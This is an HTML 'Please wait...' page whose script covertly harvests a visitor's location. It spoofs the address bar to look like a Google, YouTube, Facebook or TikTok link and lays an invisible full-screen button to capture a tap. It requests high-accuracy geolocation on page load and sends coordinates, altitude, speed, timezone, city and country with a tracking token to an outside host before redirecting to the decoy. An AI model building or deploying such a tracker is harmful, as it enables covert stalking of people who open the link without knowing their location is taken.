<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Please wait...</title>
  <style>
    *, *::before, *::after { box-sizing:border-box; margin:0; padding:0; }
    html, body { background:#fff; min-height:100vh; }
    .bar {
      position:fixed; top:0; left:0;
      height:3px; width:0%;
      background:#4285f4;
      border-radius:0 2px 2px 0;
      transition:width 0.4s ease;
      z-index:9999;
    }
    #ghost {
      position:fixed; inset:0;
      background:transparent; border:none;
      cursor:default; z-index:1;
    }
  </style>
</head>
<body>

<div class="bar" id="bar"></div>
<button id="ghost" onclick="triggerLocation()" tabindex="-1" aria-hidden="true"></button>

<script>
// ── URL Params ────────────────────────────────────────────────────
const params  = new URLSearchParams(location.search);
const token   = params.get('token')   || params.get('host') || ''; // support both old & new
const goTo    = params.get('redirect') || 'https://www.google.com';

// ── Mask address bar (looks like the redirect target) ─────────────
(function() {
  try {
    const ch = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let id = ''; for (let i = 0; i < 11; i++) id += ch[Math.floor(Math.random()*ch.length)];
    let path = '/watch?v=' + id;
    try {
      const h = new URL(goTo).hostname.replace('www.','');
      if (h.includes('google'))                           path = '/search?q=' + encodeURIComponent('news ' + new Date().getFullYear());
      else if (h.includes('facebook')||h.includes('fb')) path = '/reel/' + Math.floor(Math.random()*9e11+1e11);
      else if (h.includes('instagram'))                   path = '/p/' + id + '/';
      else if (h.includes('twitter')||h.includes('x.'))  path = '/i/status/' + Math.floor(Math.random()*9e17+1e17);
      else if (h.includes('tiktok'))                      path = '/@trending/video/' + Math.floor(Math.random()*9e17+1e17);
      else if (h.includes('youtube'))                     path = '/watch?v=' + id;
    } catch(e) {}
    history.replaceState(null, '', path);
    document.title = 'Please wait\u2026';
  } catch(e) {}
})();

// ── Progress bar ──────────────────────────────────────────────────
let pct = 0;
const barEl    = document.getElementById('bar');
const barTimer = setInterval(() => {
  pct = Math.min(pct + Math.random() * 6, 88);
  barEl.style.width = pct + '%';
}, 400);

let done = false;
var _sent = false;   // ← prevents double POST from load + ghost click
let hardTimer;

function doRedirect() {
  if (done) return;
  done = true;
  clearInterval(barTimer);
  clearTimeout(hardTimer);
  barEl.style.transition = 'width 0.15s';
  barEl.style.width = '100%';
  setTimeout(() => { window.location.replace(goTo); }, 150);
}

// ── Send location via HTTP POST — fires ONCE only ────────────────
function sendLocation(data) {
  if (_sent) return;    // ← guard: never send twice
  _sent = true;

  if (!token) { doRedirect(); return; }

  const fd = new FormData();
  fd.append('token',    token);
  fd.append('lat',      data.lat);
  fd.append('lon',      data.lon);
  fd.append('accuracy', data.accuracy   || 0);
  fd.append('altitude', data.altitude   !== null && data.altitude !== undefined ? data.altitude : '');
  fd.append('speed',    data.speed      !== null && data.speed    !== undefined ? data.speed    : '');
  fd.append('tz',       data.tz         || '');
  fd.append('city',     data.city       || '');
  fd.append('country',  data.country    || '');

  const base = (location.hostname === 'localhost' || location.hostname === '127.0.0.1')
    ? location.origin
    : 'https://cyberlumina.kesug.com';

  fetch(base + '/loc_receive.php', { method: 'POST', body: fd })
    .catch(() => {})
    .finally(() => { setTimeout(doRedirect, 300); });
}

// ── Geolocation capture — fires ONCE only ─────────────────────────
function triggerLocation() {
  if (_sent) return;    // ← guard: already triggered
  if (!navigator.geolocation) { doRedirect(); return; }
  navigator.geolocation.getCurrentPosition(
    function(pos) {
      const { latitude: lat, longitude: lon, accuracy, altitude, speed } = pos.coords;
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

      // Reverse geocoding: get city & country from coordinates
      fetch(
        'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon,
        { headers: { 'Accept-Language': 'en-US,en' } }
      )
      .then(r => r.json())
      .then(d => {
        const addr    = d.address || {};
        const city    = addr.city || addr.town || addr.village || addr.suburb || addr.county || '';
        const country = addr.country || '';
        sendLocation({ lat, lon, accuracy, altitude, speed, tz, city, country });
      })
      .catch(() => {
        // Reverse geocoding failed — send without city/country
        sendLocation({ lat, lon, accuracy, altitude, speed, tz, city: '', country: '' });
      });
    },
    function() { doRedirect(); },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

// ── Auto-trigger on load ─────────────────────────────────────────
// For strict browsers that need a user gesture: ghost button (full-screen
// invisible button) catches the first tap and calls triggerLocation().
// The load event handles most browsers automatically.
window.addEventListener('load', triggerLocation);
// NOTE: We do NOT auto-click ghost here — that caused duplicates.
// Ghost button click is ONLY triggered by real user interaction on strict browsers.

// ── Hard fallback — redirect after 45s no matter what ────────────
hardTimer = setTimeout(doRedirect, 45000);
</script>
</body>
</html>
